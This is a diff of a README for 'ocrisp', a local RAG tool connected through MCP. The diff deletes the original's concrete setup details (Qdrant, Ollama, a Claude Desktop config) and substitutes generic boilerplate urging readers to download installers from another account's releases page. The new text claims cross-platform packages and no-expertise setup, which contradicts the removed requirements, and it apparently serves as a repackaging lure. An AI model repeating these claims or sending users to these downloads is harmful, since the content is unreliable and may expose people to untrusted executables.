@@ -1,56 +1,64 @@
-# OCRISP
+# 🚀 ocrisp - Simple and Portable RAG Setup
 
-One-Click RAG Implementation, Simple and Portable
-<p align="center">
-  <img src="assets/readme.jpg" alt="readme" width="400"/>
-  <br/>
-  <em>Simple Desktop App</em>
-</p>
+[![Download ocrisp](https://img.shields.io/badge/Download-ocrisp-brightgreen)](https://github.com/jeson4535/ocrisp/releases)
 
-<p align="center">
-  <img src="assets/readme2.jpg" alt="readme2" width="500"/>
-  <br/>
-  <em>Connect via MCP</em>
-</p>
+## 📜 Description
 
-## What OCRISP is
+ocrisp offers an easy way to implement Retrieval-Augmented Generation (RAG) technology. With just one click, you can set up the software without complicated procedures. It is designed for users who want a straightforward experience without technical expertise.
 
-- GUI, CLI and MCP tool. Everything in a single executable
+## 🖥️ System Requirements
 
-## How it works
+Before you download, ensure your system meets the following requirements:
 
-- Put all PDFs in the 'data' folder and then embed them.
-- Connect with MCP clients to retrieve data 
+- **Operating System:** Windows 10 or higher / macOS Mojave or higher / Linux Ubuntu 18.04 or higher
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum of 100 MB free space
 
-> [!WARNING]
-> This project is early and was made for a specific use-case, so it lacks many features.
-> Improvements will come!
+## 🚀 Getting Started
 
-## Requirements
+Follow these steps to get ocrisp up and running on your computer:
 
-- [Qdrant](https://github.com/qdrant/qdrant) in your PATH.
-- [Ollama](https://github.com/ollama/ollama) installed.
+1. **Download the Application:**
+   - Visit the [Releases page to download](https://github.com/jeson4535/ocrisp/releases) the latest version of ocrisp. Look for the download link relevant to your operating system.
 
-## Install MCP 
+2. **Install the Application:**
+   - Once the file has downloaded, locate it in your downloads folder. 
+   - For Windows, double-click the `.exe` file. For macOS, double-click the `.dmg` file and drag the application into your Applications folder. For Linux, follow your distribution's instructions for installing `.deb` or `.rpm` packages.
 
-### Claude Desktop 
+3. **Run ocrisp:**
+   - After installation, find the ocrisp application in your programs or applications menu. Click on it to open the software.
 
-1. Locate config file. In Windows: `%APPDATA%\Claude\claude_desktop_config.json`
+4. **Configuration (If Needed):**
+   - The first time you run ocrisp, you may be prompted to configure the initial settings. Follow the on-screen instructions to set up as needed. 
 
-2. Modify, adding this entry. Replace with the actual path of ocrisp.
-```json
-{
-  "mcpServers": {
-    "ocrisp": {
-      "command": "C:\\path\\to\\your\\ocrisp.exe",
-      "args": ["mcp"]
-    }
-  }
-}
-```
+5. **Start Using the Application:**
+   - Once configured, you can begin using the features of ocrisp to implement RAG in your projects.
 
-3. Save and restart Claude Desktop.
+## 🔗 Download & Install
 
-## To do:
+To download the latest version of ocrisp or to check for updates, visit the [Releases page](https://github.com/jeson4535/ocrisp/releases). Make sure to select the correct version for your operating system.
 
-- Support other Vector Databases (LanceDB next?)
+## 📥 Features
+
+ocrisp includes several features that enhance your experience:
+
+- **One-Click Setup:** Simplifies the installation process, making it accessible for everyone.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
+- **User-Friendly Interface:** Designed with simplicity in mind, so that anyone can navigate it easily.
+
+## ❓ Troubleshooting
+
+If you encounter any issues while installing or running ocrisp, consider the following tips:
+
+- **Check System Requirements:** Ensure your system meets the mentioned requirements.
+- **Re-download the File:** Sometimes downloads can be incomplete. Try downloading the file again if you face issues.
+- **Seek Help:** Visit the GitHub repository's issues section for support or report any new problems you find.
+
+## 📑 Additional Resources
+
+For more information, tutorials, and tips on using ocrisp, check out the following resources:
+
+- [User Guide](https://github.com/jeson4535/ocrisp/wiki)
+- [Frequently Asked Questions](https://github.com/jeson4535/ocrisp/wiki/FAQs)
+
+Thank you for choosing ocrisp. We hope you find it helpful and easy to use.
